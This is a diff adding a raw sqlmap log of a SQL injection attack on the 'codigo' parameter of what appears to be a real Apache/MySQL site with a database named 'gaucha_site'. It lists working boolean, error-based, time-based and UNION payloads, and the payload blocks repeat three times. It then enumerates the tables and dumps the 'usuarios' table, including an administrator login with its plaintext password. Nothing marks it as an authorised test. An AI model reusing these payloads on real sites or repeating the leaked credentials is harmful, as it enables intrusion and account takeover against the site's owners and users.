@@ -1,0 +1,112 @@
+sqlmap identified the following injection point(s) with a total of 63 HTTP(s) requests:
+---
+Parameter: codigo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: codigo=99 AND 8803=8803
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: codigo=99 AND (SELECT 6856 FROM(SELECT COUNT(*),CONCAT(0x7176707071,(SELECT (ELT(6856=6856,1))),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: codigo=99 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: codigo=-7167 UNION ALL SELECT NULL,CONCAT(0x7176707071,0x4a587470746f45497a767364727162787576507a4252544a77445a504c54414b5262664b69686f78,0x716a7a6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- dWtw
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] gaucha_site
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: codigo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: codigo=99 AND 8803=8803
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: codigo=99 AND (SELECT 6856 FROM(SELECT COUNT(*),CONCAT(0x7176707071,(SELECT (ELT(6856=6856,1))),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: codigo=99 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: codigo=-7167 UNION ALL SELECT NULL,CONCAT(0x7176707071,0x4a587470746f45497a767364727162787576507a4252544a77445a504c54414b5262664b69686f78,0x716a7a6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- dWtw
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: gaucha_site
+[7 tables]
++------------+
+| categorias |
+| empresa    |
+| logs       |
+| news       |
+| news_ass   |
+| produtos   |
+| usuarios   |
++------------+
+
+Database: gaucha_site
++------------+---------+
+| Table      | Entries |
++------------+---------+
+| news_ass   | 231     |
+| produtos   | 94      |
+| categorias | 9       |
+| empresa    | 1       |
+| logs       | 1       |
+| usuarios   | 1       |
++------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: codigo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: codigo=99 AND 8803=8803
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: codigo=99 AND (SELECT 6856 FROM(SELECT COUNT(*),CONCAT(0x7176707071,(SELECT (ELT(6856=6856,1))),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: codigo=99 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: codigo=-7167 UNION ALL SELECT NULL,CONCAT(0x7176707071,0x4a587470746f45497a767364727162787576507a4252544a77445a504c54414b5262664b69686f78,0x716a7a6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- dWtw
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: gaucha_site
+Table: usuarios
+[1 entry]
++------------+---------------+--------+-------+--------+
+| id_usuario | nome          | senha  | login | status |
++------------+---------------+--------+-------+--------+
+| 1          | Administrador | 1q2w3e | admin | A      |
++------------+---------------+--------+-------+--------+
+
